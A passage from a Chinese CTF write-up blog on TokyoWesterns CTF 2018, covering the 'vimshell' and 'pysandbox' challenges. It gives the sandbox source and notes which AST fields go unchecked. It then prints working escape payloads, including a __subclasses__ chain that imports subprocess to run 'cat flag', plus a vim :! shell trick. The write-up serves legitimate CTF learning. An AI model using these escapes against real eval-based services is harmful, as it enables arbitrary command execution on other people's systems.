+<p>chrome -app=<a href="https://vimshell.chal.ctf.westerns.tokyo/" rel="external nofollow" target="_blank">https://vimshell.chal.ctf.westerns.tokyo</a></p>
+<p>Ctrl + W -&gt; :! cat /flag</p>
+</blockquote>
+<h1 id="pysandbox"><a href="#pysandbox" class="headerlink" title="pysandbox"></a>pysandbox</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> ast</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">blacklist = [ast.Call, ast.Attribute]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check</span><span class="params">(node)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> isinstance(node, list):</span><br><span class="line">        <span class="keyword">return</span> all([check(n) <span class="keyword">for</span> n <span class="keyword">in</span> node])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="string">"""</span></span><br><span class="line"><span class="string">	expr = BoolOp(boolop op, expr* values)</span></span><br><span class="line"><span class="string">	     | BinOp(expr left, operator op, expr right)</span></span><br><span class="line"><span class="string">	     | UnaryOp(unaryop op, expr operand)</span></span><br><span class="line"><span class="string">	     | Lambda(arguments args, expr body)</span></span><br><span class="line"><span class="string">	     | IfExp(expr test, expr body, expr orelse)</span></span><br><span class="line"><span class="string">	     | Dict(expr* keys, expr* values)</span></span><br><span class="line"><span class="string">	     | Set(expr* elts)</span></span><br><span class="line"><span class="string">	     | ListComp(expr elt, comprehension* generators)</span></span><br><span class="line"><span class="string">	     | SetComp(expr elt, comprehension* generators)</span></span><br><span class="line"><span class="string">	     | DictComp(expr key, expr value, comprehension* generators)</span></span><br><span class="line"><span class="string">	     | GeneratorExp(expr elt, comprehension* generators)</span></span><br><span class="line"><span class="string">	     -- the grammar constrains where yield expressions can occur</span></span><br><span class="line"><span class="string">	     | Yield(expr? value)</span></span><br><span class="line"><span class="string">	     -- need sequences for compare to distinguish between</span></span><br><span class="line"><span class="string">	     -- x &lt; 4 &lt; 3 and (x &lt; 4) &lt; 3</span></span><br><span class="line"><span class="string">	     | Compare(expr left, cmpop* ops, expr* comparators)</span></span><br><span class="line"><span class="string">	     | Call(expr func, expr* args, keyword* keywords,</span></span><br><span class="line"><span class="string">			 expr? starargs, expr? kwargs)</span></span><br><span class="line"><span class="string">	     | Repr(expr value)</span></span><br><span class="line"><span class="string">	     | Num(object n) -- a number as a PyObject.</span></span><br><span class="line"><span class="string">	     | Str(string s) -- need to specify raw, unicode, etc?</span></span><br><span class="line"><span class="string">	     -- other literals? bools?</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	     -- the following expression can appear in assignment context</span></span><br><span class="line"><span class="string">	     | Attribute(expr value, identifier attr, expr_context ctx)</span></span><br><span class="line"><span class="string">	     | Subscript(expr value, slice slice, expr_context ctx)</span></span><br><span class="line"><span class="string">	     | Name(identifier id, expr_context ctx)</span></span><br><span class="line"><span class="string">	     | List(expr* elts, expr_context ctx) </span></span><br><span class="line"><span class="string">	     | Tuple(expr* elts, expr_context ctx)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">	      -- col_offset is the byte offset in the utf8 string the parser uses</span></span><br><span class="line"><span class="string">	      attributes (int lineno, int col_offset)</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">        """</span></span><br><span class="line"></span><br><span class="line">        attributes = &#123;</span><br><span class="line">            <span class="string">'BoolOp'</span>: [<span class="string">'values'</span>],</span><br><span class="line">            <span class="string">'BinOp'</span>: [<span class="string">'left'</span>, <span class="string">'right'</span>],</span><br><span class="line">            <span class="string">'UnaryOp'</span>: [<span class="string">'operand'</span>],</span><br><span class="line">            <span class="string">'Lambda'</span>: [<span class="string">'body'</span>],</span><br><span class="line">            <span class="string">'IfExp'</span>: [<span class="string">'test'</span>, <span class="string">'body'</span>, <span class="string">'orelse'</span>],</span><br><span class="line">            <span class="string">'Dict'</span>: [<span class="string">'keys'</span>, <span class="string">'values'</span>],</span><br><span class="line">            <span class="string">'Set'</span>: [<span class="string">'elts'</span>],</span><br><span class="line">            <span class="string">'ListComp'</span>: [<span class="string">'elt'</span>],</span><br><span class="line">            <span class="string">'SetComp'</span>: [<span class="string">'elt'</span>],</span><br><span class="line">            <span class="string">'DictComp'</span>: [<span class="string">'key'</span>, <span class="string">'value'</span>],</span><br><span class="line">            <span class="string">'GeneratorExp'</span>: [<span class="string">'elt'</span>],</span><br><span class="line">            <span class="string">'Yield'</span>: [<span class="string">'value'</span>],</span><br><span class="line">            <span class="string">'Compare'</span>: [<span class="string">'left'</span>, <span class="string">'comparators'</span>],</span><br><span class="line">            <span class="string">'Call'</span>: <span class="keyword">False</span>, <span class="comment"># call is not permitted</span></span><br><span class="line">            <span class="string">'Repr'</span>: [<span class="string">'value'</span>],</span><br><span class="line">            <span class="string">'Num'</span>: <span class="keyword">True</span>,</span><br><span class="line">            <span class="string">'Str'</span>: <span class="keyword">True</span>,</span><br><span class="line">            <span class="string">'Attribute'</span>: <span class="keyword">False</span>, <span class="comment"># attribute is also not permitted</span></span><br><span class="line">            <span class="string">'Subscript'</span>: [<span class="string">'value'</span>],</span><br><span class="line">            <span class="string">'Name'</span>: <span class="keyword">True</span>,</span><br><span class="line">            <span class="string">'List'</span>: [<span class="string">'elts'</span>],</span><br><span class="line">            <span class="string">'Tuple'</span>: [<span class="string">'elts'</span>],</span><br><span class="line">            <span class="string">'Expr'</span>: [<span class="string">'value'</span>], <span class="comment"># root node </span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> k, v <span class="keyword">in</span> attributes.items():</span><br><span class="line">            <span class="keyword">if</span> hasattr(ast, k) <span class="keyword">and</span> isinstance(node, getattr(ast, k)):</span><br><span class="line">                <span class="keyword">if</span> isinstance(v, bool):</span><br><span class="line">                    <span class="keyword">return</span> v</span><br><span class="line">                <span class="keyword">return</span> all([check(getattr(node, attr)) <span class="keyword">for</span> attr <span class="keyword">in</span> v])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    expr = sys.stdin.read()</span><br><span class="line">    body = ast.parse(expr).body</span><br><span class="line"> 	<span class="keyword">print</span> body</span><br><span class="line">    <span class="keyword">if</span> check(body):</span><br><span class="line">        sys.stdout.write(repr(eval(expr)))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sys.stdout.write(<span class="string">"Invalid input"</span>)</span><br><span class="line">    sys.stdout.flush()</span><br></pre></td></tr></table></figure>
+<p>官网过滤<a href="https://docs.python.org/2/library/ast.html" rel="external nofollow" target="_blank">https://docs.python.org/2/library/ast.html</a>:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">expr = BoolOp(boolop op, expr* values)</span><br><span class="line">	     | BinOp(expr left, operator op, expr right)</span><br><span class="line">	     | UnaryOp(unaryop op, expr operand)</span><br><span class="line">	     | Lambda(arguments args, expr body)</span><br><span class="line">	     | IfExp(expr test, expr body, expr orelse)</span><br><span class="line">	     | Dict(expr* keys, expr* values)</span><br><span class="line">	     | Set(expr* elts)</span><br><span class="line">	     | ListComp(expr elt, comprehension* generators)</span><br><span class="line">	     | SetComp(expr elt, comprehension* generators)</span><br><span class="line">	     | DictComp(expr key, expr value, comprehension* generators)</span><br><span class="line">	     | GeneratorExp(expr elt, comprehension* generators)</span><br><span class="line">	     -- the grammar constrains where yield expressions can occur</span><br><span class="line">	     | Yield(expr? value)</span><br><span class="line">	     -- need sequences for compare to distinguish between</span><br><span class="line">	     -- x &lt; 4 &lt; 3 and (x &lt; 4) &lt; 3</span><br><span class="line">	     | Compare(expr left, cmpop* ops, expr* comparators)</span><br><span class="line">	     | Call(expr func, expr* args, keyword* keywords,</span><br><span class="line">			 expr? starargs, expr? kwargs)</span><br><span class="line">	     | Repr(expr value)</span><br><span class="line">	     | Num(object n) -- a number as a PyObject.</span><br><span class="line">	     | Str(string s) -- need to specify raw, unicode, etc?</span><br><span class="line">	     -- other literals? bools?</span><br><span class="line"></span><br><span class="line">	     -- the following expression can appear in assignment context</span><br><span class="line">	     | Attribute(expr value, identifier attr, expr_context ctx)</span><br><span class="line">	     | Subscript(expr value, slice slice, expr_context ctx)</span><br><span class="line">	     | Name(identifier id, expr_context ctx)</span><br><span class="line">	     | List(expr* elts, expr_context ctx) </span><br><span class="line">	     | Tuple(expr* elts, expr_context ctx)</span><br><span class="line"></span><br><span class="line">	      -- col_offset is the byte offset in the utf8 string the parser uses</span><br><span class="line">	      attributes (int lineno, int col_offset)</span><br></pre></td></tr></table></figure>
+<p>区别案例：</p>
+<table>
+<thead>
+<tr>
+<th>Original</th>
+<th>Implemented Checks</th>
+<th>Unchecked parts</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>Lambda(arguments args, expr body)</td>
+<td>‘Lambda’: [‘body’]</td>
+<td>args</td>
+</tr>
+<tr>
+<td>ListComp(expr elt, comprehension* generators)</td>
+<td>‘ListComp’: [‘elt’]</td>
+<td>generators</td>
+</tr>
+<tr>
+<td>Subscript(expr value, slice slice, expr_context ctx)</td>
+<td>Subscript’: [‘value’]</td>
+<td>slice, ctx</td>
+</tr>
+</tbody>
+</table>
+<p>payload:</p>
+<p>list: </p>
+<ul>
+<li><code>[e for e in list(open(&#39;flag&#39;))]</code></li>
+<li><code>[1 for x in [eval(&quot;sys.stdout.write(repr([t for t in ().__class__.__base__.__subclasses__() if t.__name__ == &#39;Sized&#39;][0].__len__.__globals__[&#39;__builtins__&#39;][&#39;__import__&#39;](&#39;subprocess&#39;).check_output(&#39;cat flag&#39;, shell=True)))&quot;)]]</code></li>
+</ul>
+<p>Subscript: </p>
+<ul>
+<li><code>[][sys.stdout.write(open(&#39;flag&#39;).read())]</code></li>
+</ul>
+<p>我们以<code>Subscript</code>为例, 打印<code>ast.parse</code>处理后的结果:</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">expr = <span class="string">"[][sys.stdout.write(open('shell.php').read())]"</span></span><br><span class="line">body = ast.parse(expr)</span><br><span class="line"><span class="keyword">print</span> ast.dump(body)</span><br></pre></td></tr></table></figure>
+<p>我们可以发现表达式被解析成几个部分:<code>value</code>, <code>slice</code>, <code>ctx</code></p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Module(body=[Expr(value=Subscript(value=List(elts=[], ctx=Load()), slice=Index(value=Call(func=Attribute(value=Attribute(value=Name(id='sys', ctx=Load()), attr='stdout', ctx=Load()), attr='write', ctx=Load()), args=[Call(func=Attribute(value=Call(func=Name(id='open', ctx=Load()), args=[Str(s='shell.php')], keywords=[], starargs=None, kwargs=None), attr='read', ctx=Load()), args=[], keywords=[], starargs=None, kwargs=None)], keywords=[], starargs=None, kwargs=None)), ctx=Load()))])</span><br></pre></td></tr></table></figure>
+<p>sandbox中仅仅检查了<code>value</code>，因而，可以绕过该sandbox。</p>
+
+    </article>
+    <!-- license  -->
+    
+        <div class="license-wrapper">
+            <p>原文作者: <a href="https://www.tiandiwuji.top">Tianji</a>
+            </p><p>原文链接: <a href="https://www.tiandiwuji.top/posts/42614/">https://www.tiandiwuji.top/posts/42614/</a>
+            </p><p>发表日期: <a href="https://www.tiandiwuji.top/posts/42614/">September 2nd 2018, 10:32:29 pm</a>
+            </p><p>版权声明: 本文采用<a rel="external nofollow" href="http://creativecommons.org/licenses/by-nc/4.0/" target="_blank">知识共享署名-非商业性使用 4.0 国际许可协议</a>进行许可</p>
+        </div>
+    
+    <!-- paginator  -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+                <div class="nextSlogan">Next Post</div>
+                <a href="/posts/7418/" title="WEBSEC-Writeup">
+                    <div class="nextTitle">WEBSEC-Writeup</div>
+                </a>
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/posts/12920/" title="awd准备工作">
+                    <div class="prevTitle">awd准备工作</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- 评论插件 -->
+    <!-- 来必力City版安装代码 -->
+
+    <div id="lv-container" data-id="city" data-uid="MTAyMC8zODcyNS8xNTI1Mw==">
+        <script type="text/javascript">
+            (function (d, s) {
+                var j, e = d.getElementsByTagName(s)[0];
+                if (typeof LivereTower === 'function') { return; }
+                j = d.createElement(s);
+                j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+                j.async = true;
+
+                e.parentNode.insertBefore(j, e);
+            })(document, 'script');
+        </script>
+        <noscript>为正常使用来必力评论功能请激活JavaScript</noscript>
+    </div>
+
+<!-- City版安装代码已完成 -->
+    
+    
+    <!--PC和WAP自适应版-->
+
+    <!--PC版-->
+
+
+    
+    
+
+    <!-- 评论 -->
+</main>
+            <!-- profile -->
+            
+        </div>
+        <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+    <div class="social">
+        
+    
+        
+            
+                <a href="mailto:fengyunhetao@gmail.com" class="iconfont-archer email" title="email" rel="external nofollow" target="_blank"></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/fengyuhetao" class="iconfont-archer github" target="_blank" title="github"></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+    </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank" rel="external nofollow">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank" rel="external nofollow">Archer</a></span>
+    </div>
+    <!-- 不蒜子  -->
+    
+    <div class="busuanzi-container">
+    
+     
+    <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+    
+    </div>
+    
+</footer>
+    </div>
+    <!-- toc -->
+    
+    <div class="toc-wrapper" style="top:50vh;">
+        <div class="toc-catalog">
+            <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+        </div>
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#SimpleAuth"><span class="toc-number">1.</span> <span class="toc-text">SimpleAuth</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Shrine"><span class="toc-number">2.</span> <span class="toc-text">Shrine</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#递归打印对象的所有字属性"><span class="toc-number">2.0.1.</span> <span class="toc-text">递归打印对象的所有字属性</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#寻找config"><span class="toc-number">2.0.2.</span> <span class="toc-text">寻找config</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#payload"><span class="toc-number">2.0.3.</span> <span class="toc-text">payload</span></a></li></ol></li></ol><li class="toc-item toc-level-1"><a class="toc-link" href="#Slack-emoji-converter"><span class="toc-number">3.</span> <span class="toc-text">Slack emoji converter</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#vimshell"><span class="toc-number">4.</span> <span class="toc-text">vimshell</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#pysandbox"><span class="toc-number">5.</span> <span class="toc-text">pysandbox</span></a></li>
+    </div>
+    
+    <div class="back-top iconfont-archer">&#xe639;</div>
+    <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+          <div class="sidebar-panel-archives">
+    <!-- 在ejs中将archive按照时间排序 -->
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 44
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+    
+    
+    
+    <div class="archive-year"> 2018 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/05</span><a class="archive-post-title" href="/posts/18428/">lamp && lnmp以apt-get的方式安装</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/04</span><a class="archive-post-title" href="/posts/7418/">WEBSEC-Writeup</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">09/02</span><a class="archive-post-title" href="/posts/42614/">TokyoWesterns CTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/21</span><a class="archive-post-title" href="/posts/12920/">awd准备工作</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/41139/">how2heap-分析总结（一）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/06</span><a class="archive-post-title" href="/posts/27029/">0ctf2018-babyheap</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">08/03</span><a class="archive-post-title" href="/posts/39475/">ctfzone-ctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href="/posts/13474/">real-world-ctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/30</span><a class="archive-post-title" href="/posts/6549/">ISITDTU-CTF</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/23</span><a class="archive-post-title" href="/posts/46785/">巅峰极客ctf</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/18</span><a class="archive-post-title" href="/posts/5109/">php-命令执行</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href="/posts/62555/">RSA学习</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/17</span><a class="archive-post-title" href="/posts/28940/">ssti</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/15</span><a class="archive-post-title" href="/posts/45992/">php命令执行函数</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">07/09</span><a class="archive-post-title" href="/posts/63527/">ollyice</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/30</span><a class="archive-post-title" href="/posts/16486/">web安全备忘录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/30</span><a class="archive-post-title" href="/posts/29914/">ssrf+gopher</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/26</span><a class="archive-post-title" href="/posts/22546/">googlectf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/24</span><a class="archive-post-title" href="/posts/9490/">proc的作用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/21</span><a class="archive-post-title" href="/posts/32268/">sctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/14</span><a class="archive-post-title" href="/posts/54865/">python多线程和lock和Rlock</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/54897/">linux格式化字符串漏洞</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/29112/">pwn前置知识</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/08</span><a class="archive-post-title" href="/posts/5359/">sqlmap使用</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/04</span><a class="archive-post-title" href="/posts/50844/">linux命令执行</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">06/04</span><a class="archive-post-title" href="/posts/51203/">LRE_PAYLOAD绕过open_basedir</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/17498/">mysql忘记密码/修改密码</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/62889/">docker使用手册</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/29</span><a class="archive-post-title" href="/posts/56136/">普通用户免密码切换到root</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/28</span><a class="archive-post-title" href="/posts/26365/">suctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/23527/">phpinfo解读</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/posts/9764/">rctf2018学习笔记</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/21</span><a class="archive-post-title" href="/posts/32791/">bypassaslr_1</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/09</span><a class="archive-post-title" href="/posts/53269/">pwn备忘录</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/08</span><a class="archive-post-title" href="/posts/62655/">cbc翻转</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/07</span><a class="archive-post-title" href="/posts/60875/">misc思路</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span><a class="archive-post-title" href="/posts/33488/">简单的命令（shell+python）</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/24</span><a class="archive-post-title" href="/posts/15636/">parse_url + curl</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/20</span><a class="archive-post-title" href="/posts/22230/">ddctf2018</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/18</span><a class="archive-post-title" href="/posts/65402/">PHP代码审计归纳</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/27</span><a class="archive-post-title" href="/posts/52452/">xss</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/27</span><a class="archive-post-title" href="/posts/24854/">url相对路径和绝对路径</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/26</span><a class="archive-post-title" href="/posts/40688/">python3和python2 base64的问题</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
